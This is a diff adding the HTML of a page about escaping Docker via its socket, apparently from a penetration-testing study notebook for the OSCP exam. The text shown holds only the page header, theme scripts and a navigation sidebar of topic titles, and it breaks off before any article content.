@@ -1,0 +1,1310 @@
+
+<!DOCTYPE html>
+
+<html class="no-js" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<link href="../index-of-docker_escapes/" rel="prev"/>
+<link href="../../../firewall_evasion/firewall_evasion-home/" rel="next"/>
+<link href="../../../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.5.3, mkdocs-material-9.4.8" name="generator"/>
+<title>via-docker-socket - oscp_field_manual</title>
+<link href="../../../assets/stylesheets/main.4b4a2bd9.min.css" rel="stylesheet"/>
+<link href="../../../assets/stylesheets/palette.356b1318.min.css" rel="stylesheet"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
+<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+<script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body data-md-color-accent="indigo" data-md-color-primary="pink" data-md-color-scheme="default" dir="ltr">
+<script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#via-docker-socket">
+          Skip to content
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header md-header--shadow" data-md-component="header">
+<nav aria-label="Header" class="md-header__inner md-grid">
+<a aria-label="oscp_field_manual" class="md-header__button md-logo" data-md-component="logo" href="../../.." title="oscp_field_manual">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            oscp_field_manual
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              via-docker-socket
+            
+          </span>
+</div>
+</div>
+</div>
+<form class="md-header__option" data-md-component="palette">
+<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="pink" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_2" hidden="" title="Switch to dark mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path></svg>
+</label>
+<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="blue" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="pink" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"></path></svg>
+</label>
+</form>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg>
+</label>
+<nav aria-label="Search" class="md-search__options">
+<button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"></path></svg>
+</button>
+</nav>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            Initializing search
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Navigation" class="md-nav md-nav--primary" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="oscp_field_manual" class="md-nav__button md-logo" data-md-component="logo" href="../../.." title="oscp_field_manual">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
+</a>
+    oscp_field_manual
+  </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../..">
+<span class="md-ellipsis">
+    home
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../geopolitical_concepts/">
+<span class="md-ellipsis">
+    geopolitical_concepts
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../index-of-oscp_field_manual/">
+<span class="md-ellipsis">
+    Index of oscp field manual
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../proof_of_concept/">
+<span class="md-ellipsis">
+    proof of concept
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_5" type="checkbox"/>
+<label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+<span class="md-ellipsis">
+    OPCODE DICTIONARY
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_5_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_5">
+<span class="md-nav__icon md-icon"></span>
+            OPCODE DICTIONARY
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../OPCODE_DICTIONARY/x86-64/">
+<span class="md-ellipsis">
+    x86-64 Instruction Set
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_6" type="checkbox"/>
+<label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+<span class="md-ellipsis">
+    Binary exploitation
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_6_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_6">
+<span class="md-nav__icon md-icon"></span>
+            Binary exploitation
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/binary_exploitation-home/">
+<span class="md-ellipsis">
+    binary_exploitation-home
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/index-of-binary_exploitation/">
+<span class="md-ellipsis">
+    Index of binary exploitation
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/shellcode/">
+<span class="md-ellipsis">
+    shellcode
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_6_4" type="checkbox"/>
+<label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+<span class="md-ellipsis">
+    Buffer overflow
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_6_4_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_4">
+<span class="md-nav__icon md-icon"></span>
+            Buffer overflow
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/buffer_overflow/index-of_buffer-overflow/">
+<span class="md-ellipsis">
+    Index of buffer overflow
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/buffer_overflow/intro-to-buffer-overflow/">
+<span class="md-ellipsis">
+    intro-to-buffer-overflow
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_6_4_3" type="checkbox"/>
+<label class="md-nav__link" for="__nav_6_4_3" id="__nav_6_4_3_label" tabindex="0">
+<span class="md-ellipsis">
+    Case studies
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_6_4_3_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_6_4_3">
+<span class="md-nav__icon md-icon"></span>
+            Case studies
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/buffer_overflow/case-studies/basic-rop/">
+<span class="md-ellipsis">
+    basic-rop
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/buffer_overflow/case-studies/index-of_buffer-overflow_case-studies/">
+<span class="md-ellipsis">
+    Index of buffer overflow case studies
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/buffer_overflow/case-studies/pico_ctf_bo2/">
+<span class="md-ellipsis">
+    pico_ctf_bo2
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_6_5" type="checkbox"/>
+<label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
+<span class="md-ellipsis">
+    Shared library highjacking
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_6_5_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_5">
+<span class="md-nav__icon md-icon"></span>
+            Shared library highjacking
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/shared-library-highjacking/index-of_shared-library-hijacking/">
+<span class="md-ellipsis">
+    Index of shared library hijacking
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_6_5_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_6_5_2" id="__nav_6_5_2_label" tabindex="0">
+<span class="md-ellipsis">
+    Linux shared libs
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_6_5_2_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_6_5_2">
+<span class="md-nav__icon md-icon"></span>
+            Linux shared libs
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/shared-library-highjacking/linux-shared-libs/LD_PRELOAD-function-hooking/">
+<span class="md-ellipsis">
+    LD_PRELOAD-function-hooking
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../binary_exploitation/shared-library-highjacking/linux-shared-libs/index-of_linux-shared-libs/">
+<span class="md-ellipsis">
+    Index of linux shared libs
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_7" type="checkbox"/>
+<label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+<span class="md-ellipsis">
+    Docker
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="true" aria-labelledby="__nav_7_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_7">
+<span class="md-nav__icon md-icon"></span>
+            Docker
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../index-of-docker/">
+<span class="md-ellipsis">
+    Index of docker
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_7_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+<span class="md-ellipsis">
+    Docker escapes
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="true" aria-labelledby="__nav_7_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_7_2">
+<span class="md-nav__icon md-icon"></span>
+            Docker escapes
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../index-of-docker_escapes/">
+<span class="md-ellipsis">
+    Index of docker escapes
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+<span class="md-ellipsis">
+    via-docker-socket
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="./">
+<span class="md-ellipsis">
+    via-docker-socket
+  </span>
+</a>
+<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#briefing">
+    briefing
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#procedure">
+    procedure
+  </a>
+<nav aria-label="procedure" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#preparations">
+    preparations
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#start-our-malicious-container">
+    start our malicious container
+  </a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#request-shell-from-docker-socket">
+    request shell from docker socket
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#conclusion">
+    conclusion
+  </a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_8" type="checkbox"/>
+<label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+<span class="md-ellipsis">
+    Firewall evasion
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_8_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_8">
+<span class="md-nav__icon md-icon"></span>
+            Firewall evasion
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../firewall_evasion/firewall_evasion-home/">
+<span class="md-ellipsis">
+    general firewall evasion tactics
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../firewall_evasion/index-of-firewall_evasion/">
+<span class="md-ellipsis">
+    Index of firewall evasion
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_9" type="checkbox"/>
+<label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+<span class="md-ellipsis">
+    Freedom of movement
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_9_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_9">
+<span class="md-nav__icon md-icon"></span>
+            Freedom of movement
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/bash_isms/">
+<span class="md-ellipsis">
+    bash_isms
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/cmdline_analysis/">
+<span class="md-ellipsis">
+    cmdline_analysis
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/docker/">
+<span class="md-ellipsis">
+    Docker
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/find_command/">
+<span class="md-ellipsis">
+    The Find Command
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/freedom_of_movement/">
+<span class="md-ellipsis">
+    freedom of movement
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/gpg/">
+<span class="md-ellipsis">
+    gpg
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/index-of-freedom_of_movement/">
+<span class="md-ellipsis">
+    Index of freedom of movement
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/powershell_cheatsheet/">
+<span class="md-ellipsis">
+    PowerShell Movements
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/serving_files/">
+<span class="md-ellipsis">
+    methods of serving to victims
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/tmux/">
+<span class="md-ellipsis">
+    tmux
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/tshark/">
+<span class="md-ellipsis">
+    tshark
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/vi_or_vim/">
+<span class="md-ellipsis">
+    vi_or_vim
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_9_13" type="checkbox"/>
+<label class="md-nav__link" for="__nav_9_13" id="__nav_9_13_label" tabindex="0">
+<span class="md-ellipsis">
+    Services
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_9_13_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_9_13">
+<span class="md-nav__icon md-icon"></span>
+            Services
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/services/dns/">
+<span class="md-ellipsis">
+    DNS
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/services/ftp/">
+<span class="md-ellipsis">
+    ftp specific movements
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/services/index-of-services/">
+<span class="md-ellipsis">
+    Index of services
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/services/smb/">
+<span class="md-ellipsis">
+    smb specific movements
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_9_13_5" type="checkbox"/>
+<label class="md-nav__link" for="__nav_9_13_5" id="__nav_9_13_5_label" tabindex="0">
+<span class="md-ellipsis">
+    Databases
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_9_13_5_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_9_13_5">
+<span class="md-nav__icon md-icon"></span>
+            Databases
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/services/databases/MySql/">
+<span class="md-ellipsis">
+    MySQL
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/services/databases/NoSQL_MongoDB/">
+<span class="md-ellipsis">
+    NoSQL_MongoDB
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/services/databases/index-of-databases/">
+<span class="md-ellipsis">
+    Index of databases
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_9_14" type="checkbox"/>
+<label class="md-nav__link" for="__nav_9_14" id="__nav_9_14_label" tabindex="0">
+<span class="md-ellipsis">
+    Software
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_9_14_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_9_14">
+<span class="md-nav__icon md-icon"></span>
+            Software
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/software/burpsuite/">
+<span class="md-ellipsis">
+    burpsuite
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/software/index-of-software/">
+<span class="md-ellipsis">
+    Index of software
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/software/web-browser/">
+<span class="md-ellipsis">
+    Hotkeys &amp; keystokes
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../freedom_of_movement/software/wireshark/">
+<span class="md-ellipsis">
+    wireshark
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_10" type="checkbox"/>
+<label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+<span class="md-ellipsis">
+    Hash cracking
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_10_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_10">
+<span class="md-nav__icon md-icon"></span>
+            Hash cracking
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../hash_cracking/hashcat/">
+<span class="md-ellipsis">
+    basic guide to hashcat
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../hash_cracking/index-of-hash_cracking/">
+<span class="md-ellipsis">
+    Index of hash cracking
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_11" type="checkbox"/>
+<label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+<span class="md-ellipsis">
+    Linux
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_11_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_11">
+<span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../linux/index-of-linux/">
+<span class="md-ellipsis">
+    Index of linux
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../linux/lin_enumeration/">
+<span class="md-ellipsis">
+    linux_enumeration
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../linux/persistence/">
+<span class="md-ellipsis">
+    persistence
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../linux/proc-pseudo-file-system/">
+<span class="md-ellipsis">
+    proc-pseudo-file-system
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_12" type="checkbox"/>
+<label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+<span class="md-ellipsis">
+    Metasploit framework
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_12_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_12">
+<span class="md-nav__icon md-icon"></span>
+            Metasploit framework
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../metasploit_framework/index-of-metasploit_framework/">
+<span class="md-ellipsis">
+    Index of metasploit framework
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../metasploit_framework/msfconsole/">
+<span class="md-ellipsis">
+    msfconsole
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../metasploit_framework/msfvenom/">
+<span class="md-ellipsis">
+    msfvenom
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../metasploit_framework/searchsploit/">
+<span class="md-ellipsis">
+    searchsploit cheat sheet
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_13" type="checkbox"/>
+<label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+<span class="md-ellipsis">
+    Report writing
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_13_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_13">
+<span class="md-nav__icon md-icon"></span>
+            Report writing
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../report_writing/index-of-report_writing/">
+<span class="md-ellipsis">
+    Index of report writing
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../report_writing/md_cheatsheet/">
+<span class="md-ellipsis">
+    Md cheatsheet
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../report_writing/report_writing-home/">
+<span class="md-ellipsis">
+    Report writing home
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_14" type="checkbox"/>
+<label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+<span class="md-ellipsis">
+    Shells
+  </span>
+<span class="md-nav__icon md-icon"></span>
